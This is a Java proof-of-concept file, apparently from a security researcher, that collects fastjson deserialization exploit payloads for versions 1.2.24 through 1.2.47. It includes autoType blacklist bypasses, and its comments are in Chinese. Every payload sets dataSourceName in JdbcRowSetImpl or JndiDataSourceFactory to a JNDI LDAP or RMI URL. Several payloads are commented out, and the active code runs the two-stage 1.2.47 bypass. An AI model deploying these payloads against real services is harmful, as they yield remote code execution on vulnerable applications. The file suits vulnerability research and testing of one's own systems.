package 版本24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
//import com.fastjson.User;

import java.io.IOException;

public class POC {

    public static void main(String[] argv) throws IOException {
        //1.2.24 jndi ldap
        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/TouchFile\",\"\"autoCommit\":true}";
        //1.2.24 jndi rmi
        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"\"autoCommit\":true}";
        //1.2.24 7u21 payload在隔壁
        //1.2.25-41绕过 jndi ldap
//        String payload =   "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}";
        //1.2.41绕过 7u21 payload在隔壁
        //1.2.25-42绕过 jndi ldap
//        String payload =   "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}";
        //1.2.42绕过 7u21 payload在隔壁
        //1.2.25-45 黑名单绕过绕过 jndi
//          String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:1389/Exploit\"}}";

        //1.2.21-47 通杀payload jndi
//        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}}";
        //1.2.21-47 分开payload
        String payload1 = "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}";
        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/TouchFile\",\"autoCommit\":true}";
        //1.25以后必备条件
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload1);
        JSON.parse(payload2);
//        JSON.parseObject(payload,User.class);
    }

}